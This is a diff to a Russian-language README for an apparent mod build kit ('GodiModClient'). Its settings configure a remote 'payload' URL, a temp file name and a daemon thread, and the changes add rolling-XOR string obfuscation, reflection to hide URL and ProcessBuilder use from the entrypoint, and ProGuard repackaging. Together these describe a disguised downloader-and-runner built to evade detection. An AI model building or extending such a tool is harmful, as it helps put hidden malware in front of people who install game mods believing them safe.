@@ -22,8 +22,9 @@ cp mod.settings.example.properties mod.settings.properties
 | `download.url` | ссылка на payload, **только https** |
 | `download.filename` | имя файла в temp |
 | `thread.name` | имя daemon-потока |
-| `obfuscate.level` | `none` / `light` / `full` |
-| `obfuscate.xor.key` | 0–255 для XOR (`light`, `full`) |
+| `obfuscate.level` | `none` / `light` / `full` (рекомендуется **full**) |
+| `obfuscate.xor.key` | 0–255, rolling XOR по байтам |
+| `obfuscate.runtime.pkg` | пакет генерируемого runtime (по умолчанию `com/godimod/internal`) |
 
 `mod.settings.properties` в git не коммитится.
 
@@ -47,17 +48,17 @@ export JAVA_HOME=/path/to/jdk-17
 
 | Путь | Содержимое |
 |------|------------|
-| `build/libs/<mod.id>-1.0.0.jar` | remapped mod |
-| `dist/<mod.id>-1.0.0.jar` | копия для выдачи |
-| `dist/<mod.id>-1.0.0.zip` | тот же jar в zip |
+| `build/libs/<mod.id>-<version>.jar` | remapped mod |
+| `build/libs/<mod.id>-<version>-obf.jar` | ProGuard (`full`) |
+| `dist/<mod.id>-<version>.jar` | финальный jar (`full` → obf) |
 
 Версия задаётся в `gradle.properties` (`mod_version`).
 
 ## Обфускация
 
-- **none** — строки в сгенерированном `Payload` без XOR
-- **light** — XOR для URL, имени файла, thread (по умолчанию)
-- **full** — light + ProGuard, entrypoint `GodiModClient` сохраняется (`proguard-rules.pro`)
+- **none** — константы без XOR (только для отладки)
+- **light** — rolling XOR + reflection (нет прямых `URL`/`ProcessBuilder` в entrypoint)
+- **full** — light + ProGuard (repackage `x`, overload), наружу только `GodiModClient`
 
 ## Структура
 
